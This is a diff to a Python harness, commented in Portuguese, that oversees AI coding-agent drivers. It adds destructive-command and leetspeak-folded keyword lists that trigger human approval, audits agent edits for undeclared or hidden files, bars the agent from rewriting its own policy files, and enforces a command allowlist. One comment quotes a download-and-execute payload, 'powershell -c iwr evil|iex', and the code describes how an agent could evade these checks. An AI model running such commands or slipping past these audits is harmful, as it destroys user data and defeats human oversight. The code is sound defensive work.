@@ -108,6 +108,9 @@ PUBLISH_VERBS = (
     # paráfrases coloquiais de evasão (MÉDIO-10 banca v6)
     "manda pra prod", "manda para prod", "bota no servidor", "coloca no servidor",
     "sobe pra producao", "manda pro ar",
+    # Publish/release EN (banca v11 — A3): 'ship it', 'go live', 'push to prod'.
+    "ship", "shipped", "shipping", "go live", "goes live", "going live",
+    "push to prod", "push to production", "release", "released", "releases",
 )
 DESTRUCTIVE_VERBS = (
     "deleta", "deletar", "delete", "exclui", "excluir", "apaga", "apagar",
@@ -139,6 +142,13 @@ DESTRUCTIVE_VERBS = (
     "rm", "rd", "del", "dd of=", "dropdb", "dropuser", "drop database",
     "checkout --", "git restore", "restore --", "branch -d", "format e:",
     "format f:", "format a:", "format b:", "format g:", "sdelete64",
+    # Cobertura EN provada ausente (banca v11 — A3): paráfrases naturais que
+    # chegavam ao driver em EXECUTAR sem trava humana.
+    "nuke", "nuked", "nuking", "clean", "cleaned", "cleaning", "revert",
+    "reverted", "reverting", "prune", "pruned", "pruning", "undo", "undone",
+    "reset --hard", "checkout .", "docker system prune", "docker volume prune",
+    "kubectl delete", "terraform destroy", "helm uninstall", "systemctl stop",
+    "systemctl disable", "roll back", "rolled back", "obliterate",
 )
 METACONFIG_SIGNALS = (
     "package.json", "package-lock", "lockfile", "requirements", "pyproject",
@@ -173,6 +183,10 @@ _HOMOGLYPHS = str.maketrans({
     # Latim estendido/armênio/IPA que a tabela não cobria (banca v10 — A5):
     "ɑ": "a", "ɛ": "e", "ı": "i", "ե": "e", "ռ": "r", "ʀ": "r",
     "ɢ": "g", "ʟ": "l", "ɴ": "n", "ɵ": "o", "ɸ": "o", "χ": "x",
+    # Leetspeak/dígitos-homoglifos (banca v11 — A3): 'd3l3t3', 'w1p3',
+    # 'nu|<' → dobra para a letra óbvia antes da comparação de termos.
+    "0": "o", "1": "l", "3": "e", "4": "a", "5": "s", "7": "t",
+    "@": "a", "$": "s", "!": "i",
 })
 
 
@@ -218,12 +232,15 @@ def _atomic_write_json(path: Path, data: object) -> None:
 
 
 def _child_env() -> dict:
-    env = os.environ.copy()
+    # A2 (banca v11): GIT_DIR/GIT_WORK_TREE/GIT_INDEX_FILE/GIT_CONFIG_* do
+    # ambiente redirecionam o git interno (âncora HEAD, status --ignored,
+    # check-ignore) para outro repo/index — strip em todo filho.
+    env = {k: v for k, v in os.environ.items() if not k.startswith("GIT_")}
     env["PYTHONUTF8"] = "1"
     env["PYTHONIOENCODING"] = "utf-8"
     # F-07 (banca v8): CreateProcess/`shutil.which` procuram no CWD no
     # Windows — um `git.exe`/`npm.cmd` plantado no repo seria executado por
-    # driver `cmd:`/agent:/test_cmd. Remove o CWD do path de busca.
+    # driver `cmd:`/agent:/test_cmd/git interno. Remove o CWD do path de busca.
     env["NoDefaultCurrentDirectoryInExePath"] = "1"
     return env
 
@@ -517,7 +534,7 @@ def _git_head(repo_root: Path) -> str | None:
              "-c", "core.fsmonitor=false", "-c", "diff.external=",
              "rev-parse", "HEAD"],
             capture_output=True, text=True, encoding="utf-8", errors="replace",
-            timeout=15,
+            timeout=15, env=_child_env(),
         )
         if res.returncode == 0:
             return (res.stdout or "").strip() or None
@@ -694,7 +711,7 @@ def _kill_process_tree(proc: subprocess.Popen) -> None:
         try:
             subprocess.run(
                 ["taskkill", "/F", "/T", "/PID", str(proc.pid)],
-                capture_output=True, timeout=20,
+                capture_output=True, timeout=20, env=_child_env(),
             )
         except Exception:
             try:
@@ -848,6 +865,10 @@ def _dispatch_driver(
             return None, err, 1  # driver executou e falhou: falha mecânica, não uso
         return result, "", 0
 
+    # B7 (banca v11): `--driver agent` bare virava opencode silenciosamente —
+    # o usuário rodava um driver diferente do que imaginava.
+    if driver == "agent":
+        return None, "driver 'agent' sem alvo — use agent:<cli>[:model]", 2
     if isinstance(driver, str) and driver.split(":", 1)[0] in ("opencode", "agent"):
         # agent:<cli>[:model] → adapter genérico; 'opencode' é atalho de 'agent:opencode'.
         spec = driver.split(":", 1)[1] if driver.startswith("agent:") else (
@@ -1133,11 +1154,16 @@ def _run_auto_inner(args: argparse.Namespace) -> int:
     if policy_name is None:
         print(f"ERRO: --policy inválida '{policy_flag}'. Válidas: {', '.join(POLICY_VALID)}", file=sys.stderr)
         return 2
+    # A9 (banca v11): campo-lista com tipo errado (`always_ask: 5`) fazia
+    # list(5) explodir TypeError antes da classificação — coage: não-lista
+    # vira lista-vazia (fail-safe: perde restrição, não ganha permissão).
+    def _plist(v):
+        return v if isinstance(v, list) else []
     policy_efetiva = {
         "policy": policy_name,
-        "always_ask": list(policy_doc.get("always_ask") or []),
-        "auto_approve": list(policy_doc.get("auto_approve") or []),
-        "allowed_cmds": list(policy_doc.get("allowed_cmds") or []),
+        "always_ask": _plist(policy_doc.get("always_ask")),
+        "auto_approve": _plist(policy_doc.get("auto_approve")),
+        "allowed_cmds": _plist(policy_doc.get("allowed_cmds")),
         "source": policy_source,
         "flag": policy_flag,
     }
@@ -1329,12 +1355,17 @@ def _run_auto_inner(args: argparse.Namespace) -> int:
                 and (_sc["fields"][f] != _run_now.get(f))
             ] if isinstance(_sc, dict) else []
             if _drift:
-                raise RuntimeError(
+                # B2 (banca v11): RuntimeError escapava do except em traceback
+                # feio — erro limpo + aborto; NÃO pode ser engolido pelo
+                # except abaixo (drift ignorado = retomar run adulterada).
+                raise ValueError(
                     "ANCHOR-DRIFT: âncoras da run divergem do sidecar local "
                     f"({', '.join(_drift)}) — retomada recusada"
                 )
-    except (OSError, ValueError):
-        pass
+    except (OSError, ValueError) as _ae:
+        if "ANCHOR-DRIFT" in str(_ae):
+            print(f"ERRO: {_ae}", file=sys.stderr)
+            return 2
     _record_stage(
         run_path, "route",
         f"mode={route.get('mode')} archetype={route.get('archetype')} "
@@ -1492,6 +1523,17 @@ def _run_auto_inner(args: argparse.Namespace) -> int:
                         t.startswith(".henke/")
                         and any(t.startswith(m) or t == m for m in _henke_mutable))
                 )
+                # A8 (banca v11): POLICY/PROJECT/baselines são inputs de
+                # veredito — o driver NUNCA pode "declarar" a própria
+                # configuração (declarado passava pelo audit e persistia
+                # envenenando a próxima run).
+                _never_declared = {
+                    ".henke/policy.json", ".henke/project.json",
+                    ".henke/ratchet-baseline.tsv", ".henke/fence.json",
+                    ".henke/coverage-ledger.json",
+                }
+                undeclared = sorted(set(undeclared) | {
+                    t for t in touched if t.lower() in _never_declared})
                 # F2 (banca v8): escrita em path IGNORADO é invisível a todo
                 # portão de diff — só o snapshot de nascimento (ancorado no
                 # sidecar) vs. o atual revela arquivo escondido (evil.log,
@@ -1509,6 +1551,7 @@ def _run_auto_inner(args: argparse.Namespace) -> int:
                          "-uall", "--ignored", "-z"],
                         cwd=str(repo_root), capture_output=True, text=True,
                         encoding="utf-8", errors="replace", timeout=30,
+                        env=_child_env(),
                     )
                     if _si.returncode == 0:
                         cur_ig = {
@@ -1538,6 +1581,7 @@ def _run_auto_inner(args: argparse.Namespace) -> int:
                         cwd=str(repo_root), capture_output=True, text=True,
                         input="\n".join(sorted(declared)) + "\n",
                         encoding="utf-8", errors="replace", timeout=30,
+                        env=_child_env(),
                     )
                     if _ci.returncode == 0:
                         # Rastreado+modificado aparece em `touched` mesmo casando
@@ -1601,6 +1645,19 @@ def _run_auto_inner(args: argparse.Namespace) -> int:
             )
 
     # ---- estágio 6: portões obrigatórios + auto-reparo (MAX_REWORK) ----
+    # A1 (banca v11 — CRÍTICO): o portão `mutant` recebe test_cmd via
+    # --test-cmd e o EXECUTA durante os portões — validar a allowlist só no
+    # estágio 7 deixava `test_cmd: "powershell -c iwr evil|iex"` rodar como
+    # "portão obrigatório". A allowlist vale daqui pra frente.
+    test_cmd = (project or {}).get("test_cmd")
+    _allowed = policy_efetiva.get("allowed_cmds") or []
+    if isinstance(_allowed, str):
+        _allowed = [_allowed]  # string solta não vira prefixo-por-caractere
+    _allowed_set = {" ".join(str(p).split()) for p in _allowed if str(p).strip()}
+    _test_cmd_rejected = bool(
+        _allowed_set and test_cmd
+        and " ".join(str(test_cmd).split()) not in _allowed_set)
+    _gate_test_cmd = None if _test_cmd_rejected else test_cmd
     gates_timeout = float(timeout_opt) if timeout_opt else 300.0
     gres: dict | None = None
     rework_attempts = 0
@@ -1615,7 +1672,7 @@ def _run_auto_inner(args: argparse.Namespace) -> int:
     else:
         while True:
             gres = _invoke_gates(repo_root, gates_required, run_id, gates_timeout,
-                                 test_cmd=(project or {}).get("test_cmd"))
+                                 test_cmd=_gate_test_cmd)
             if gres is None:
                 # Runner externo indisponível: registra cada portão como não-veredito
                 # (exit 2) — fail-closed, nunca verde presumido.
@@ -1658,20 +1715,78 @@ def _run_auto_inner(args: argparse.Namespace) -> int:
             break
     _patch_run(run_path, lambda d: d.update({"rework_attempts": rework_attempts}))
 
+    # A4 (banca v11): o rework re-despacha o driver DEPOIS da auditoria
+    # files_changed↔diff — escrita não-declarada ou em path IGNORADO (invisível
+    # a todo portão de diff) no rework passava batida. Re-audita ao sair do loop.
+    if rework_attempts and real_driver:
+        try:
+            from scripts.spec_drift import get_touched_files as _gtf2
+            from scripts.run_state import load_anchor_sidecar as _las2
+            _anchor2 = _ign2 = None
+            _sc2 = _las2(run_path.stem, repo_root=repo_root)
+            if isinstance(_sc2, dict):
+                _anchor2 = _sc2.get("head_start")
+                _ign2 = (_sc2.get("fields") or {}).get("ignored_start")
+            _decl2 = {
+                str(f).replace("\\", "/").strip().removeprefix("./")
+                for f in (driver_result.get("files_changed") or [])
+            }
+            _henke_mut2 = (".henke/runs/", ".henke/evidence/",
+                           ".henke/exec_log.jsonl", ".henke/gate-baseline.json",
+                           ".henke/install-manifest.json")
+            _und2 = sorted(
+                t for t in set(_gtf2(repo_root, against=_anchor2))
+                if t not in _decl2 and not (
+                    t.startswith(".henke/")
+                    and any(t.startswith(m) or t == m for m in _henke_mut2)))
+            _newig2: list[str] = []
+            if _ign2 is not None:
+                _si2 = subprocess.run(
+                    ["git", "-c", "core.fsmonitor=false",
+                     "-c", "diff.external=", "status", "--porcelain",
+                     "-uall", "--ignored", "-z"],
+                    cwd=str(repo_root), capture_output=True, text=True,
+                    encoding="utf-8", errors="replace", timeout=30,
+                    env=_child_env(),
+                )
+                if _si2.returncode == 0:
+                    _cur2 = {
+                        e[3:].strip() for e in _si2.stdout.split("\0")
+                        if e.startswith("!! ") and e[3:].strip()
+                    }
+                    _newig2 = sorted(
+                        p for p in _cur2 - set(_ign2)
+                        if not p.startswith(".henke/") and p not in _decl2)
+                    _newig2 += [
+                        f"{p} (deletado)" for p in set(_ign2) - _cur2
+                        if not p.startswith(".henke/") and p not in _decl2]
+            _never2 = {
+                ".henke/policy.json", ".henke/project.json",
+                ".henke/ratchet-baseline.tsv", ".henke/fence.json",
+                ".henke/coverage-ledger.json",
+            }
+            _und2 = sorted(set(_und2) | {
+                t for t in set(_gtf2(repo_root, against=_anchor2))
+                if t.lower() in _never2})
+            if _und2 or _newig2:
+                record_gate(
+                    run_path, "files_changed_audit", 1,
+                    "REWORK-UNDECLARED: edição do rework fora da declaração/"
+                    f"invisível: {', '.join((_und2 + _newig2)[:20])}")
+            else:
+                record_gate(run_path, "files_changed_audit", 0,
+                            "rework audit: diff ⊆ declaração, ignorados intactos")
+        except Exception as _ae:
+            record_gate(run_path, "files_changed_audit", 2,
+                        f"rework audit indisponível: {_ae}")
+
     # ---- estágio 7: testes do projeto via `henke exec` ----
     test_info: dict | None = None
-    test_cmd = (project or {}).get("test_cmd")
     if test_cmd:
-        # allowed_cmds (F-18): knob de policy antes morto — com a lista
-        # preenchida, test_cmd fora da allowlist é recusado em vez de rodar
-        # um comando arbitrário do PROJECT.json do repo.
-        _allowed = policy_efetiva.get("allowed_cmds") or []
-        if isinstance(_allowed, str):
-            _allowed = [_allowed]  # string solta não vira prefixo-por-caractere
         # A4 (banca v10): startswith deixava 'npm test-pwn' passar sob
         # 'npm test' — allowlist é match EXATO com whitespace normalizado.
-        _allowed_set = {" ".join(str(p).split()) for p in _allowed if str(p).strip()}
-        if _allowed_set and " ".join(str(test_cmd).split()) not in _allowed_set:
+        # Computada antes dos portões (banca v11 A1) e reutilizada aqui.
+        if _test_cmd_rejected:
             t_exit, t_out = 2, (
                 f"ALLOWED-CMDS-REJECTED: test_cmd '{test_cmd}' fora da "
                 "allowlist de POLICY.json"
